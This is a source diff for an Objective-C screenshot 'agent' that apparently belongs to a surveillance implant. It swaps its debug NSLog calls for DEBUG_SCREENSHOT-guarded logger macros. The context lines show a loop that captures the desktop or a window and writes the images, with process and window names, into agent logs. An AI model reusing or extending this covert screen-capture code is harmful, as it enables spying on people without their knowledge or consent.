@@ -11,7 +11,8 @@
 
 #import "RCSMAgentScreenshot.h"
 
-//#define DEBUG
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
 
 
 static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
@@ -174,8 +175,8 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
   [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct) + processNameLength, windowNameLength)
                                  withBytes: [[windowName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
   
-#ifdef DEBUG
-  NSLog(@"additionalHeader: %@", rawAdditionalHeader);
+#ifdef DEBUG_SCREENSHOT
+  infoLog(@"additionalHeader: %@", rawAdditionalHeader);
 #endif
   RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
   
@@ -185,14 +186,14 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
   
   if (success == TRUE)
     {
-#ifdef DEBUG
-      NSLog(@"logHeader created correctly");
+#ifdef DEBUG_SCREENSHOT
+      infoLog(@"logHeader created correctly");
 #endif
       if ([logManager writeDataToLog: imageData
                             forAgent: AGENT_SCREENSHOT
                            withLogID: 0] == TRUE)
-#ifdef DEBUG
-        NSLog(@"data written correctly");
+#ifdef DEBUG_SCREENSHOT
+        infoLog(@"data written correctly");
 #endif
       [logManager closeActiveLog: AGENT_SCREENSHOT
                        withLogID: 0];
@@ -283,14 +284,14 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
 - (void)start
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-#ifdef DEBUG
-  NSLog(@"Agent screenshot started");
+#ifdef DEBUG_SCREENSHOT
+  infoLog(@"Agent screenshot started");
 #endif
   
   [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
   //int dwTag = [[mAgentConfiguration objectForKey: @"dwTag"] intValue];
-#ifdef DEBUG
-  NSLog(@"AgentConf: %@", mAgentConfiguration);
+#ifdef DEBUG_SCREENSHOT
+  infoLog(@"AgentConf: %@", mAgentConfiguration);
 #endif
   while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
          [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
@@ -306,14 +307,14 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
       
       if ([self _grabScreenshot: grabEntireDesktop] == YES)
         {
-#ifdef DEBUG
-          NSLog(@"Screenshotted! SPLASH");
+#ifdef DEBUG_SCREENSHOT
+          infoLog(@"Screenshotted! SPLASH");
 #endif
         }
       else
         {
-#ifdef DEBUG
-          NSLog(@"An error occurred while snapshotting");
+#ifdef DEBUG_SCREENSHOT
+          errorLog(@"An error occurred while snapshotting");
 #endif
         }
       
